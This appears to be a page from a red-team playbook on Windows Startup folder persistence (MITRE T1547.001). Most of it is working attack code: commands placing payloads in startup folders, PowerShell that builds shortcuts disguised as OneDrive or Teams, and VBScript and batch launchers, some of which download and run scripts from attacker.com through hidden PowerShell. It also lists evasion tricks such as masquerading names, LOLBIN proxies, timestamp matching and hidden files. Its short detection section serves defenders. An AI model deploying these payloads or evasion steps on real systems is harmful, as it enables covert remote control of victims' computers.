# Startup Folder Persistence

> **MITRE ATT&CK**: Persistence > T1547.001 - Boot or Logon Autostart Execution
> **Platforms**: Windows
> **Required Privileges**: User (personal startup), Admin (all-users startup)
> **OPSEC Risk**: Medium-High (easily discovered by users and defenders, but simple and reliable)

---

## Strategic Overview

The Startup folder is the simplest Windows persistence mechanism: any executable, script, or shortcut placed in the Startup folder runs automatically when the user logs in. As a Red Team Lead, you should recognize that this is a low-sophistication technique that is checked early in any incident response investigation. However, its simplicity makes it valuable in scenarios where speed of deployment matters more than stealth, such as during time-constrained operations or when persistence needs to be established quickly before pivoting to more covert mechanisms. The technique is also useful as a decoy persistence -- placing an obvious payload in the Startup folder can draw defender attention while the real persistence mechanism operates elsewhere.

## Technical Deep-Dive

### User-Specific Startup Folder

```bash
# User startup folder location
# shell:startup = %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

# Copy executable directly
copy C:\temp\payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHelper.exe"

# Copy script
copy C:\temp\update.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\UpdateCheck.vbs"

# Copy batch file
copy C:\temp\sync.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\CloudSync.bat"
```

### All-Users Startup Folder

```bash
# All-users startup folder (requires admin)
# shell:common startup = C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

# Copy payload for all users
copy C:\temp\payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SecurityAgent.exe"

# Verify with dir
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

### LNK File Placement (Shortcuts)

LNK files are more flexible than direct executables -- they can specify arguments, working directories, and window states.

```powershell
# Create LNK file pointing to payload
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk")
$shortcut.TargetPath = "C:\ProgramData\updater.exe"
$shortcut.Arguments = "--silent --background"
$shortcut.WorkingDirectory = "C:\ProgramData"
$shortcut.WindowStyle = 7  # Minimized
$shortcut.IconLocation = "C:\Windows\System32\shell32.dll,3"  # Folder icon
$shortcut.Description = "Microsoft OneDrive Sync"
$shortcut.Save()

# LNK that launches PowerShell payload
$shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Teams.lnk")
$shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = "-w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('https://attacker.com/beacon.ps1'))"
$shortcut.WindowStyle = 7
$shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\lync.exe,0"
$shortcut.Save()

# LNK via cmd.exe (indirect execution)
$shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Helper.lnk")
$shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$shortcut.Arguments = "/c start /min C:\ProgramData\payload.exe"
$shortcut.WindowStyle = 7
$shortcut.Save()
```

### VBScript in Startup

```vbscript
' UpdateCheck.vbs - placed in Startup folder
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('https://attacker.com/p.ps1'))", 0, False

' Alternative: Direct execution with no window
Set objShell = CreateObject("WScript.Shell")
objShell.Run "C:\ProgramData\payload.exe", 0, False
```

### Batch Script in Startup

```batch
@echo off
REM CloudSync.bat - placed in Startup folder
start /min "" "C:\ProgramData\sync_agent.exe"

REM Alternative with delay (avoid race conditions at logon)
timeout /t 30 /nobreak >nul
start /min "" powershell.exe -w hidden -ep bypass -f "C:\ProgramData\scripts\update.ps1"
```

### PowerShell-Based Deployment

```powershell
# Deploy payload to startup folder via PowerShell
$startupPath = [Environment]::GetFolderPath('Startup')
Copy-Item "C:\temp\payload.exe" "$startupPath\SecurityHelper.exe" -Force

# Deploy to all-users startup
$commonStartup = [Environment]::GetFolderPath('CommonStartup')
Copy-Item "C:\temp\payload.exe" "$commonStartup\SystemHelper.exe" -Force

# Verify startup folder contents
Get-ChildItem $startupPath
Get-ChildItem $commonStartup

# Create startup item via COM (alternative method)
$shell = New-Object -ComObject Shell.Application
$startup = $shell.Namespace(7)  # 7 = Startup folder
$startup.Self.Path
```

### Combining with Other Techniques

```powershell
# LNK to LOLBIN that loads payload (defense evasion layer)
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ConfigUpdate.lnk")
$shortcut.TargetPath = "C:\Windows\System32\mshta.exe"
$shortcut.Arguments = "C:\ProgramData\config.hta"
$shortcut.WindowStyle = 7
$shortcut.Save()

# LNK to rundll32 loading DLL payload
$shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Helper.lnk")
$shortcut.TargetPath = "C:\Windows\System32\rundll32.exe"
$shortcut.Arguments = "C:\ProgramData\helper.dll,DllMain"
$shortcut.WindowStyle = 7
$shortcut.Save()
```

## Detection & Evasion

### Detection Mechanisms
- **Autoruns (Sysinternals)**: Directly enumerates Startup folder contents
- **File system monitoring**: Sysmon Event ID 11 (FileCreate) in Startup paths
- **Visual inspection**: Users may notice unfamiliar items in Task Manager Startup tab
- **EDR monitoring**: File creation in known Startup folder paths
- **Group Policy**: StartUp folder contents can be audited via GPO

### Evasion Techniques
- Use LNK files with legitimate icons and names rather than raw executables
- Reference the LNK target as a LOLBIN (mshta, rundll32) instead of direct payload
- Name files to match expected software (OneDriveSync, TeamsUpdater, AdobeHelper)
- Set file timestamps to match other legitimate Startup items
- Use hidden file attributes on the placed file
- Place payload binary in a legitimate-looking directory, use LNK to reference it

### OPSEC Considerations
- This is a well-known technique checked in every IR playbook
- Users can see Startup items in Task Manager (Windows 10+)
- Startup folder contents are easily enumerable via PowerShell or dir commands
- Consider this as a secondary or decoy persistence mechanism
- The All-Users startup folder requires admin but affects every user on the system
- Cleanup is trivial: delete the file from the Startup folder

## Cross-References

- `04-persistence/registry-persistence.md` - Registry Run keys (more covert alternative)
- `04-persistence/scheduled-tasks.md` - Scheduled tasks (more flexible alternative)
- `04-persistence/com-hijacking.md` - COM hijacking (stealthier alternative)
- `03-execution/lolbins.md` - LOLBAS for indirect execution from LNK files

## References

- MITRE T1547.001: https://attack.mitre.org/techniques/T1547/001/
- Windows Startup folder paths: https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid
- Autoruns documentation: https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns
- LNK file analysis: https://www.sans.org/blog/looking-at-lnk-files/
